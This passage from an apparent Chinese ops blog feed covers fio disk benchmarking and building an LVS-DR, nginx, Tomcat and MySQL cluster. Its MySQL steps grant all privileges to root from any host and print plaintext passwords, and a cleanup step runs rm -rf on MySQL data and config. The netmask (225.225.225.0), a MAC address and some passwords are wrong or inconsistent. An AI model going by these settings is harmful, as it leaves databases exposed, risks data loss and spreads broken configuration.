class="line"></span><br></pre></td></tr></table></figure><h1 id="fio-磁盘性能压测"><a href="#fio-磁盘性能压测" class="headerlink" title="fio 磁盘性能压测"></a>fio 磁盘性能压测</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">常用参数的说明</span><br><span class="line">--debug 调试模式 </span><br><span class="line">--version 显示版本信息 </span><br><span class="line">测试任务相关的参数 </span><br><span class="line">--output&#x3D; 文件名 输出到文件 </span><br><span class="line">--runtime&#x3D; 限制运行时间 单位为秒 </span><br><span class="line">-- name&#x3D; 字符串 测试项目名称 </span><br><span class="line">--description&#x3D; 字符串 测试项目描述 </span><br><span class="line">--filename&#x3D; 测试文件，也可以制定到裸设备上 </span><br><span class="line">--size&#x3D; 测试文件大小 </span><br><span class="line">--filesize&#x3D; 单独的文件大小，也可以是一个范围，fio在设定的size只内随机的选择大小，如果没有指定，每个子文件大小相同。 </span><br><span class="line">读写相关的参数 </span><br><span class="line">--readwrite&#x3D; </span><br><span class="line">read 顺序读 </span><br><span class="line">write 顺序写 </span><br><span class="line">trim 顺序trim，只支持Linux块设备 </span><br><span class="line">randread 随机读 </span><br><span class="line">randwrite 随机写 </span><br><span class="line">randtrim 随机trim 只支持Linux块设备 </span><br><span class="line">rw，readnwrite 混合读写 </span><br><span class="line">randrw 随机混合读写 </span><br><span class="line">如果是混合读写，默认是 50&#x2F;50 即50%读加50%的写，对于特定的类型，结果会有些出入，因为速度可能不一样。可以在测试的指定一个数字， </span><br><span class="line">rwmixwrite&#x3D;20 混合读写，写占20% </span><br><span class="line">direct&#x3D;1 或者0 ，1为绕过文件系统的缓存 </span><br><span class="line">--blocksize&#x3D; </span><br><span class="line">--bs&#x3D; 测试块大小，4K 8K 1M 等 </span><br><span class="line">--bssplit&#x3D;字符串 需要测试混合块大小的时候使用，可以按照如下的格式 </span><br><span class="line">bssplit&#x3D;4k&#x2F;10:64k&#x2F;50:32k&#x2F;40 4K占10% 64K占50% 32k占40% </span><br><span class="line">也可以不指定百分比，fio会平均分配，比如 </span><br><span class="line">bssplit&#x3D;4k&#x2F;50:1k&#x2F;:32k&#x2F; 就是4k占50% 1K 32看各占25% </span><br><span class="line">bssplit 读写的时候都可以使用 </span><br><span class="line">运行相关参数 </span><br><span class="line">--max-job&#x3D; 运行的最高线程 </span><br><span class="line">--zero_buffers 如果使用这个参数，fio会初始化IO缓存，并默认使用随机的数据填满缓存。 </span><br><span class="line">--refill_buffers 强制重新填写读写缓存 </span><br><span class="line">--iodepth&#x3D; io队列深度 默认是1 </span><br><span class="line">--direct&#x3D; 0或者1 1为关闭文件系统缓存 </span><br><span class="line">--numjobs&#x3D; 线程数量 </span><br><span class="line">--group_reporting 汇总每个进程的信息 </span><br><span class="line">--lockmem&#x3D; 固件测试的时候内存大小 比如2G </span><br><span class="line">--nrfiles&#x3D;8 每个进程生成文件的数量</span><br><span class="line"></span><br><span class="line">下面几个参数在libaio的引擎下的作用： </span><br><span class="line">--iodepth_batch&#x3D;当队列里面的IO个数达到该值的时候，就调用io_submit批次提交请求 </span><br><span class="line">--iodepth_batch_complete&#x3D;一次最多可收割的io数 </span><br><span class="line">--iodepth_low&#x3D;队列的io数降到该值，就重新填充</span><br><span class="line"></span><br><span class="line">2.fio使用案例</span><br><span class="line">文件系统4k顺序读测试 </span><br><span class="line">fio --filename&#x3D;&#x2F;tmp&#x2F;test --direct&#x3D;1 --rw&#x3D;read --bs&#x3D;4k --size&#x3D;10G --numjobs&#x3D;64 --runtime&#x3D;300 --group_reporting --name&#x3D;test-read </span><br><span class="line">文件系统4k随机写测试 </span><br><span class="line">fio --filename&#x3D;&#x2F;tmp&#x2F;test --direct&#x3D;1 --rw&#x3D;randwrite --bs&#x3D;4k --size&#x3D;15G --numjobs&#x3D;64 --runtime&#x3D;300 --group_reporting --name&#x3D;test-read </span><br><span class="line">裸设备4k顺序写测试 </span><br><span class="line">fio --filename&#x3D;&#x2F;dev&#x2F;sdb --direct&#x3D;1 --rw&#x3D;write --bs&#x3D;4k --size&#x3D;15G --numjobs&#x3D;64 --runtime&#x3D;300 --group_reporting --name&#x3D;test-read</span><br><span class="line"></span><br><span class="line">3.测试结果解读</span><br><span class="line">fio --filename&#x3D;&#x2F;test --direct&#x3D;1 --rw&#x3D;randwrite --bs&#x3D;4k --size&#x3D;1G --numjobs&#x3D;64 --runtime&#x3D;300 --group_reporting --name&#x3D;test-randwrite </span><br><span class="line">… </span><br><span class="line">write: io&#x3D;2850.2MB, bw&#x3D;9726.1KB&#x2F;s, iops&#x3D;2431 , runt&#x3D;300048msec </span><br><span class="line">clat (usec): min&#x3D;159 , max&#x3D;448315 , avg&#x3D;410.20, stdev&#x3D;1208.19 </span><br><span class="line">lat (usec): min&#x3D;159 , max&#x3D;448315 , avg&#x3D;411.15, stdev&#x3D;1208.27 </span><br><span class="line">clat percentiles (usec): </span><br><span class="line">| 1.00th&#x3D;[ 203], 5.00th&#x3D;[ 278], 10.00th&#x3D;[ 326], 20.00th&#x3D;[ 346], </span><br><span class="line">| 30.00th&#x3D;[ 366], 40.00th&#x3D;[ 386], 50.00th&#x3D;[ 402], 60.00th&#x3D;[ 418], </span><br><span class="line">| 70.00th&#x3D;[ 434], 80.00th&#x3D;[ 454], 90.00th&#x3D;[ 486], 95.00th&#x3D;[ 516], </span><br><span class="line">| 99.00th&#x3D;[ 724], 99.50th&#x3D;[ 1032], 99.90th&#x3D;[ 1368], 99.95th&#x3D;[ 2224], </span><br><span class="line">| 99.99th&#x3D;[ 8256] </span><br><span class="line">bw (KB&#x2F;s) : min&#x3D; 3, max&#x3D; 667, per&#x3D;1.57%, avg&#x3D;152.30, stdev&#x3D;27.63 </span><br><span class="line">lat (usec) : 250&#x3D;3.92%, 500&#x3D;89.07%, 750&#x3D;6.14%, 1000&#x3D;0.32% </span><br><span class="line">lat (msec) : 2&#x3D;0.49%, 4&#x3D;0.03%, 10&#x3D;0.02%, 20&#x3D;0.01%, 50&#x3D;0.01% </span><br><span class="line">lat (msec) : 500&#x3D;0.01% </span><br><span class="line">cpu : usr&#x3D;0.04%, sys&#x3D;0.23%, ctx&#x3D;1548182, majf&#x3D;0, minf&#x3D;1844 </span><br><span class="line">IO depths : 1&#x3D;100.0%, 2&#x3D;0.0%, 4&#x3D;0.0%, 8&#x3D;0.0%, 16&#x3D;0.0%, 32&#x3D;0.0%, &gt;&#x3D;64&#x3D;0.0% </span><br><span class="line">submit : 0&#x3D;0.0%, 4&#x3D;100.0%, 8&#x3D;0.0%, 16&#x3D;0.0%, 32&#x3D;0.0%, 64&#x3D;0.0%, &gt;&#x3D;64&#x3D;0.0% </span><br><span class="line">complete : 0&#x3D;0.0%, 4&#x3D;100.0%, 8&#x3D;0.0%, 16&#x3D;0.0%, 32&#x3D;0.0%, 64&#x3D;0.0%, &gt;&#x3D;64&#x3D;0.0% </span><br><span class="line">issued : total&#x3D;r&#x3D;0&#x2F;w&#x3D;729637&#x2F;d&#x3D;0, short&#x3D;r&#x3D;0&#x2F;w&#x3D;0&#x2F;d&#x3D;0</span><br><span class="line"></span><br><span class="line">Run status group 0 (all jobs): </span><br><span class="line">WRITE: io&#x3D;2850.2MB, aggrb&#x3D;9726KB&#x2F;s, minb&#x3D;9726KB&#x2F;s, maxb&#x3D;9726KB&#x2F;s, mint&#x3D;300048msec, maxt&#x3D;300048msec</span><br><span class="line"></span><br><span class="line">Disk stats (read&#x2F;write): </span><br><span class="line">dm-0: ios&#x3D;0&#x2F;766673, merge&#x3D;0&#x2F;0, ticks&#x3D;0&#x2F;341324, in_queue&#x3D;341316, util&#x3D;86.15%, aggrios&#x3D;0&#x2F;731075, aggrmerge&#x3D;0&#x2F;35722, aggrticks&#x3D;0&#x2F;268135, aggrin_queue&#x3D;267337, aggrutil&#x3D;85.33% </span><br><span class="line">vda: ios&#x3D;0&#x2F;731075, merge&#x3D;0&#x2F;35722, ticks&#x3D;0&#x2F;268135, in_queue&#x3D;267337, util&#x3D;85.33%</span><br><span class="line"></span><br><span class="line">I&#x2F;O延迟包括三种：slat，clat，lat </span><br><span class="line">关系是 lat &#x3D; slat + clat。 </span><br><span class="line">slat 表示fio submit某个I&#x2F;O的延迟。 </span><br><span class="line">clat 表示fio complete某个I&#x2F;O的延迟。 </span><br><span class="line">lat 表示从fio将请求提交给内核，再到内核完成这个I&#x2F;O为止所需要的时间。</span><br><span class="line"></span><br><span class="line">4.通过脚本执行fio测试</span><br><span class="line">fio 也可以将测试用例写好脚本，通过运行脚本，完成多项测试任务 </span><br><span class="line">; -- start -- </span><br><span class="line">[global] </span><br><span class="line">[random-writers] </span><br><span class="line">rw&#x3D;randwrite </span><br><span class="line">bs&#x3D;4K </span><br><span class="line">direct&#x3D;1 </span><br><span class="line">size&#x3D;30G </span><br><span class="line">numjobs&#x3D;63 </span><br><span class="line">[random-read] </span><br><span class="line">rw&#x3D;randread </span><br><span class="line">bs&#x3D;4K </span><br><span class="line">direct&#x3D;1 </span><br><span class="line">size&#x3D;30G </span><br><span class="line">numjobs&#x3D;63</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> operations </category>
          
          <category> 存储 </category>
          
          <category> 数据库 </category>
          
          <category> 压测 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> 数据库 </tag>
            
            <tag> 存储 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高并发架构升级处理</title>
      <link href="2020/12/04/%E9%AB%98%E5%B9%B6%E5%8F%91%E9%9B%86%E7%BE%A4%E6%9E%B6%E6%9E%84/"/>
      <url>2020/12/04/%E9%AB%98%E5%B9%B6%E5%8F%91%E9%9B%86%E7%BE%A4%E6%9E%B6%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h1 id="第一次架构测试-LVS-DR-NGINX-处理静态"><a href="#第一次架构测试-LVS-DR-NGINX-处理静态" class="headerlink" title="第一次架构测试  LVS-DR + NGINX 处理静态"></a>第一次架构测试  LVS-DR + NGINX 处理静态</h1><h5 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">前言：使用lvs4层负载作为分发器，分发给后端nginx，由nginx 处理静态页面</span><br><span class="line"><span class="meta">#</span><span class="bash"> centos 7.6 3台</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 后端nginx 2台 ip 10.3.131.231  10.3.131.230</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> lvs分发器 1台  ip DIP 10.3.131.76 VIP 10.3.131.235</span> </span><br><span class="line"><span class="meta">#</span><span class="bash"> lvs 版本。1.2.1</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> nginx 1.16.0</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 防火墙 selinux 关闭</span></span><br></pre></td></tr></table></figure><h5 id="real-server-nginx-部署"><a href="#real-server-nginx-部署" class="headerlink" title="real server nginx 部署"></a>real server nginx 部署</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 源码安装nginx</span></span><br><span class="line">1、安装编译环境</span><br><span class="line">[root@nginx ~]# yum -y install gcc gcc-c++</span><br><span class="line">2、安装pcre软件包（使nginx支持http rewrite模块）</span><br><span class="line">[root@nginx ~]# yum install -y pcre pcre-devel</span><br><span class="line">3、安装openssl-devel（使nginx支持ssl）</span><br><span class="line">[root@nginx ~]# yum install -y openssl openssl-devel </span><br><span class="line">4、安装zlib</span><br><span class="line">[root@nginx ~]# yum install -y zlib zlib-devel</span><br><span class="line">5、创建用户nginx</span><br><span class="line">[root@nginx ~]# useradd nginx </span><br><span class="line">6、编译安装</span><br><span class="line">[root@nginx ~]# wget http://nginx.org/download/nginx-1.16.0.tar.gz</span><br><span class="line">[root@nginx ~]# tar xzf nginx-1.16.0.tar.gz -C /usr/local/</span><br><span class="line">[root@nginx ~]# cd /usr/local/nginx-1.16.0/</span><br><span class="line">[root@nginx nginx-1.16.0]# ./configure --prefix=/usr/local/nginx --group=nginx --user=nginx --sbin-path=/usr/local/nginx/sbin/nginx --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --http-client-body-temp-path=/tmp/nginx/client_body --http-proxy-temp-path=/tmp/nginx/proxy --http-fastcgi-temp-path=/tmp/nginx/fastcgi --pid-path=/var/run/nginx.pid --lock-path=/var/lock/nginx --with-http_stub_status_module --with-http_ssl_module --with-http_gzip_static_module --with-pcre --with-http_realip_module --with-stream</span><br><span class="line">[root@nginx nginx-1.16.0]# make &amp;&amp; make install</span><br><span class="line">[root@nginx ~]# mkdir /tmp/nginx</span><br><span class="line">[root@nginx ~]# /usr/local/nginx/sbin/nginx # 启动测试</span><br><span class="line">[root@nginx ~]# echo &#x27;1&#x27; &gt; /usr/local/nginx/html/index.html # 不同页面方便测试</span><br><span class="line">[root@nginx ~]# vim /etc/sysctl.conf</span><br><span class="line">net.ipv4.conf.ens33.arp_ignore = 1</span><br><span class="line">net.ipv4.conf.ens33.arp_announce = 2</span><br><span class="line">[root@nginx ~]# sysctl -p</span><br><span class="line">[root@nginx ~]# ip addr add dev lo 10.3.131.235/32</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="lvs-部署及DR模式配置"><a href="#lvs-部署及DR模式配置" class="headerlink" title="lvs 部署及DR模式配置"></a>lvs 部署及DR模式配置</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 临时设置VIP</span></span><br><span class="line">[root@lvs ~]# ip addr add dev ens33 10.3.131.235/32</span><br><span class="line"><span class="meta">#</span><span class="bash"> 永久设置VIP</span></span><br><span class="line">[root@lvs ~]# cd /etc/sysconfig/network-scripts/</span><br><span class="line">[root@lvs ~]# cp ifcfg-eth0 ifcfg-eth0:1</span><br><span class="line">[root@lvs ~]# cat ifcfg-eth0:1  # 注意设备名称和mac地址与ens33一样</span><br><span class="line">TYPE=&quot;Ethernet&quot;</span><br><span class="line">BOOTPROTO=&quot;static&quot;</span><br><span class="line">DEFROUTE=&quot;yes&quot;</span><br><span class="line">PEERDNS=&quot;yes&quot;</span><br><span class="line">PEERROUTES=&quot;yes&quot;</span><br><span class="line">IPV4_FAILURE_FATAL=&quot;no&quot;</span><br><span class="line">NAME=&quot;eth0:1&quot;</span><br><span class="line">DEVICE=&quot;eth0:1&quot;</span><br><span class="line">ONBOOT=&quot;yes&quot;</span><br><span class="line">IPADDR=&quot;10.3.131.235&quot;</span><br><span class="line">NETMASK=&quot;225.225.225.0&quot;</span><br><span class="line">HWADDR=&quot;00:0c:29:af:df:sa&quot;    </span><br><span class="line">[root@lvs ~]# systemctl start ipvsadm</span><br><span class="line">注意:启动如果报错: /bin/bash: /etc/sysconfig/ipvsadm: 没有那个文件或目录 需要手动生成文件</span><br><span class="line"><span class="meta">#</span><span class="bash"> 定义分发策略</span></span><br><span class="line">-A：添加VIP </span><br><span class="line">-t：用的是tcp协议 </span><br><span class="line">-a：添加的是lo的vip地址 </span><br><span class="line">-r：转发到realserverip </span><br><span class="line">-s：算法 </span><br><span class="line">-L|-l –list #显示内核虚拟服务器表 </span><br><span class="line">--numeric, -n：#以数字形式输出地址和端口号 </span><br><span class="line">-g --gatewaying #指定LVS工作模式为直接路由器模式DR（也是LVS默认的模式） </span><br><span class="line">-S -save #保存虚拟服务器规则到标准输出，输出为-R 选项可读的格式 </span><br><span class="line">rr：轮循 </span><br><span class="line">如果添加ip错了，删除命令如下: </span><br><span class="line"><span class="meta">#</span><span class="bash"> ip addr del 192.168.246.193 dev ens33</span></span><br><span class="line"></span><br><span class="line">[root@lvs ~]# ipvsadm -C #清除内核虚拟服务器表中的所有记录。</span><br><span class="line">[root@lvs ~]# ipvsadm -A -t 10.3.131.235:80 -s rr</span><br><span class="line">[root@lvs ~]# ipvsadm -a -t 10.3.131.235:80 -r 10.3.131.230 -g</span><br><span class="line">[root@lvs ~]# ipvsadm -a -t 10.3.131.235:80 -r 10.3.131.231 -g</span><br><span class="line">[root@lvs ~]# ipvsadm -S &gt; /etc/sysconfig/ipvsadm</span><br><span class="line">[root@lvs ~]# ipvsadm -L -n --stats #显示统计信息 </span><br><span class="line">1. Conns (connections scheduled) 已经转发过的连接数 </span><br><span class="line">2. InPkts (incoming packets) 入包个数 </span><br><span class="line">3. OutPkts (outgoing packets) 出包个数 </span><br><span class="line">4. InBytes (incoming bytes) 入流量（字节） </span><br><span class="line">5. OutBytes (outgoing bytes) 出流量（字节） </span><br><span class="line">[root@lvs ~]# ipvsadm -L -n --rate #看速率 </span><br><span class="line">1. CPS (current connection rate) 每秒连接数 </span><br><span class="line">2. InPPS (current in packet rate) 每秒的入包个数 </span><br><span class="line">3. OutPPS (current out packet rate) 每秒的出包个数 </span><br><span class="line">4. InBPS (current in byte rate) 每秒入流量（字节） </span><br><span class="line">5. OutBPS (current out byte rate) 每秒出流量（字节）</span><br></pre></td></tr></table></figure><h5 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@server ~]# curl http://10.3.131.235</span><br><span class="line">230</span><br><span class="line">[root@server ~]# curl http://10.3.131.235</span><br><span class="line">231</span><br><span class="line">[root@server ~]# curl http://10.3.131.235</span><br><span class="line">230</span><br><span class="line">[root@server ~]# curl http://10.3.131.235</span><br><span class="line">231</span><br><span class="line">[root@server ~]# curl http://10.3.131.235</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="第二次架构测试，java语言处理，tomcat-集群"><a href="#第二次架构测试，java语言处理，tomcat-集群" class="headerlink" title="第二次架构测试，java语言处理，tomcat 集群"></a>第二次架构测试，java语言处理，tomcat 集群</h1><h5 id="环境准备-1"><a href="#环境准备-1" class="headerlink" title="环境准备"></a>环境准备</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">前言：在第一次架构基础上加入对java项目处理，tomcat集群</span><br><span class="line"><span class="meta">#</span><span class="bash"> tomcat 7.0.94</span></span><br><span class="line">ip 10.3.131.236</span><br><span class="line"><span class="meta">#</span><span class="bash"> jdk 7u67</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 项目代码 jspgouv6</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 关闭防火墙 selinux</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> mysql 5.7.28 yum安装及编译安装</span> </span><br><span class="line">ip 10.3.131.239</span><br></pre></td></tr></table></figure><h5 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h5><h6 id="tomcat-部署"><a href="#tomcat-部署" class="headerlink" title="tomcat 部署"></a>tomcat 部署</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">[root@tomcat ~]# wget http://mirror.bit.edu.cn/apache/tomcat/tomcat-7/v7.0.94/bin/apache- tomcat-7.0.94.tar.gz</span><br><span class="line"><span class="meta">#</span><span class="bash"> 下载jdk</span></span><br><span class="line">JDK下载地址： https://www.oracle.com/technetwork/java/javase/downloads/java-archive-downloads- javase7-521261.html</span><br><span class="line"><span class="meta">#</span><span class="bash"> 项目包已提供</span></span><br><span class="line">[root@tomcat ~]# tar xf apache-tomcat-7.0.94.tar.gz -C /usr/local/    # 解压tomcat 到/usr/local目录下</span><br><span class="line">[root@tomcat ~]# tar xf jdk-7u67-linux-x64.tar.gz -C /usr/local/      # 解压jdk到 /usr/local 目录下</span><br><span class="line">[root@tomcat ~]# cd /usr/local/                                       # 进入 /usr/local 目录</span><br><span class="line">[root@tomcat ~]# mv jdk1.7.0_67/ java   # 修改目录名称</span><br><span class="line">[root@tomcat ~]# mv apache-tomcat-7.0.94/ tomcat</span><br><span class="line">2.修改环境变量</span><br><span class="line">[root@tomcat ~]# vim /etc/profile.d/jdk.sh</span><br><span class="line">JAVA_HOME=/usr/local/java</span><br><span class="line">PATH=$JAVA_HOME/bin:$PATH</span><br><span class="line">export JAVA_HOME PATH</span><br><span class="line">CATALINA_HOME=/usr/local/tomcat</span><br><span class="line">export CATALINA_HOME</span><br><span class="line"></span><br><span class="line">[root@tomcat ~]# source /etc/profile.d/jdk.sh</span><br><span class="line">3.检测</span><br><span class="line">[root@tomcat ~]# java -version</span><br><span class="line">java version &quot;1.7.0_67&quot;</span><br><span class="line">Java(TM) SE Runtime Environment (build 1.7.0_67-b01)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 24.65-b04, mixed mode)</span><br><span class="line">4.启动Tomcat</span><br><span class="line">[root@tomcat ~]# /usr/local/tomcat/bin/startup.sh</span><br><span class="line">(如何关闭呢:[root@qianfeng ~]# /usr/local/tomcat/bin/shutdown.sh)</span><br><span class="line">5.检查是否启动成功</span><br><span class="line">[root@tomcat ~]# netstat -tnlp | grep java</span><br><span class="line">tcp 0 0 ::ffff:127.0.0.1:8005 :::* LISTEN 6191/java</span><br><span class="line">tcp 0 0 :::8009 :::* LISTEN 6191/java</span><br><span class="line">tcp 0 0 :::8080 :::* LISTEN 6191/java</span><br><span class="line"><span class="meta">#</span><span class="bash"> 拷贝项目代码</span></span><br><span class="line">[root@tomcat ~]# rz</span><br><span class="line">[root@tomcat ~]# unzip jspgouV6-ROOT.zip </span><br><span class="line">[root@tomcat ~]# cp -r ROOT/ /usr/local/tomcat/webapps/</span><br><span class="line">[root@tomcat ~]# yum install -y mysql  # 安装mysql客户端</span><br><span class="line">[root@tomcat ~]# mysql -p&#x27;QianFeng@1234&#x27; -h 10.3.131.239</span><br><span class="line">MySQL [(none)]&gt; use jspgou</span><br><span class="line">MySQL [jspgou]&gt; source jspgou.sql</span><br><span class="line">[root@tomcat ~]# vim /usr/local/tomcat/webapps/ROOT/WEB-INF/config/jdbc.properties  # 修改下面的配置</span><br><span class="line">jdbc.url=jdbc:mysql://10.3.131.239:3306/jspgou?characterEncoding=UTF-8</span><br><span class="line">jdbc.username=root</span><br><span class="line">jdbc.password=QianFeng@123</span><br></pre></td></tr></table></figure><h6 id="mysql部署"><a href="#mysql部署" class="headerlink" title="mysql部署"></a>mysql部署</h6><p>主服务器yum安装</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">清理安装环境：</span><br><span class="line"><span class="meta">#</span><span class="bash"> yum erase mariadb mariadb-server mariadb-libs mariadb-devel -y</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> userdel -r mysql</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> rm -rf /etc/my*</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> rm -rf /var/lib/mysql</span></span><br><span class="line">[root@mysql1 ~]# wget https://dev.mysql.com/get/mysql80-community-release-el7-3.noarch.rpm</span><br><span class="line">[root@mysql1 ~]# yum -y localinstall mysql80-community-release-el7-3.noarch.rpm </span><br><span class="line">[root@mysql1 ~]# vim /etc/yum.repos.d/mysql-community.repo </span><br><span class="line">[mysql57-community]</span><br><span class="line">name=MySQL 5.7 Community Server</span><br><span class="line">baseurl=http://repo.mysql.com/yum/mysql-5.7-community/el/7/$basearch/</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql</span><br><span class="line"></span><br><span class="line">[mysql80-community]</span><br><span class="line">name=MySQL 8.0 Community Server</span><br><span class="line">baseurl=http://repo.mysql.com/yum/mysql-8.0-community/el/7/$basearch/</span><br><span class="line">enabled=0</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql</span><br><span class="line"></span><br><span class="line">[root@mysql1 ~]# yum -y install mysql-community-server</span><br><span class="line">[root@mysql1 ~]# systemctl start mysqld</span><br><span class="line">[root@mysql1 ~]# grep passw /var/log/mysqld.log </span><br><span class="line">2019-12-20T04:55:41.379206Z 1 [Note] A temporary password is generated for root@localhost: 6wis,KB.yhLk</span><br><span class="line">[root@mysql1 ~]# mysqladmin  -p&#x27;6wis,KB.yhLk&#x27; password &#x27;QianFeng@123&#x27;</span><br><span class="line">[root@mysql1 ~]# mysql -p&#x27;QianFeng@123&#x27;</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> create database jspgou default charset=utf8;</span></span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> grant all on *.* to <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;%&#x27;</span> identified by <span class="string">&#x27;QianFeng@1234&#x27;</span>;</span></span><br><span class="line">Query OK, 0 rows affected, 1 warning (0.05 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> flush privileges;</span></span><br><span class="line">Query OK, 0 rows affected (0.02 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="nginx-代理后端tomcat"><a href="#nginx-代理后端tomcat" class="headerlink" title="nginx 代理后端tomcat"></a>nginx 代理后端tomcat</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 将老的架构中的nginxupstream指向后端tomcat</span></span><br><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line">    sendfile        on;</span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line">upstream testweb &#123;</span><br><span class="line">        server 10.3.131.236:8080 weight=1 max_fails=1 fail_timeout=2s;</span><br><span class="line">&#125;</span><br><span class="line">    server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  localhost;</span><br><span class="line">    location / &#123;</span><br><span class="line">       proxy_pass http://testweb;</span><br><span class="line">       proxy_set_header Host $host:$server_port;</span><br><span class="line">       proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">       proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">        &#125;</span><br><span class="line">        error_page   500 502 503 504  /50x.html;</span><br><span class="line">        location = /50x.html &#123;</span><br><span class="line">            root   html;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h6><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-HwTXyMA4-1577026511139)(C:\Users\newrain\AppData\Roaming\Typora\typora-user-images\1576822364949.png)]</p><h1 id="第三次架构测试，tomcat集群"><a href="#第三次架构测试，tomcat集群" class="headerlink" title="第三次架构测试，tomcat集群"></a>第三次架构测试，tomcat集群</h1><h6 id="环境准备-2"><a href="#环境准备-2" class="headerlink" title="环境准备"></a>环境准备</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tomcat 集群两台，每台4实例</span><br><span class="line">ip ip 10.3.131.236 10.3.131.237</span><br><span class="line">端口采用 8081、8082、8083、8084</span><br><span class="line">主机名 tomcat  tomcat2</span><br></pre></td></tr></table></figure><h6 id="环境部署-1"><a href="#环境部署-1" class="headerlink" title="环境部署"></a>环境部署</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 部署多实例</span></span><br><span class="line">[root@tomcat ~]# cd /usr/local/</span><br><span class="line">[root@tomcat local]# ls</span><br><span class="line">bin  etc  games  include  java  lib  lib64  libexec  sbin  share  src  tomcat</span><br><span class="line">[root@tomcat local]# cp -r tomcat tomcat1</span><br><span class="line">[root@tomcat local]# cp -r tomcat tomcat2</span><br><span class="line">[root@tomcat local]# cp -r tomcat tomcat3</span><br><span class="line">[root@tomcat local]# ls</span><br><span class="line">bin  etc  games  include  java  lib  lib64  libexec  sbin  share  src  tomcat  tomcat1  tomcat2  tomcat3</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 编写修改脚本并执行，此脚本用于生成启动管理脚本</span></span><br><span class="line">[root@tomcat local]# vim mod-tomcat.sh</span><br><span class="line">sed -i &#x27;s#8005#8011#;s#8080#8081#;s#8009#8019#&#x27; /usr/local/tomcat/conf/server.xml</span><br><span class="line">sed -i &#x27;s#8005#8012#;s#8080#8082#;s#8009#8029#&#x27; /usr/local/tomcat1/conf/server.xml</span><br><span class="line">sed -i &#x27;s#8005#8013#;s#8080#8083#;s#8009#8039#&#x27; /usr/local/tomcat2/conf/server.xml</span><br><span class="line">sed -i &#x27;s#8005#8014#;s#8080#8084#;s#8009#8049#&#x27; /usr/local/tomcat3/conf/server.xml</span><br><span class="line">cat &gt;/usr/local/tomcat/bin/start.sh &lt;&lt;&#x27;EOF&#x27;</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash">tomcat</span></span><br><span class="line">export CATALINA_BASE=&quot;/usr/local/tomcat&quot;</span><br><span class="line">case &quot;$1&quot; in</span><br><span class="line">start)</span><br><span class="line">    $CATALINA_BASE/bin/startup.sh</span><br><span class="line">    ;;</span><br><span class="line">stop)</span><br><span class="line">    $CATALINA_BASE/bin/shutdown.sh</span><br><span class="line">esac</span><br><span class="line">EOF</span><br><span class="line">cat &gt;/usr/local/tomcat1/bin/start.sh &lt;&lt;&#x27;EOF&#x27;</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash">tomcat1</span></span><br><span class="line">export CATALINA_BASE=&quot;/usr/local/tomcat1&quot;</span><br><span class="line">case &quot;$1&quot; in</span><br><span class="line">start)</span><br><span class="line">    $CATALINA_BASE/bin/startup.sh</span><br><span class="line">    ;;</span><br><span class="line">stop)</span><br><span class="line">    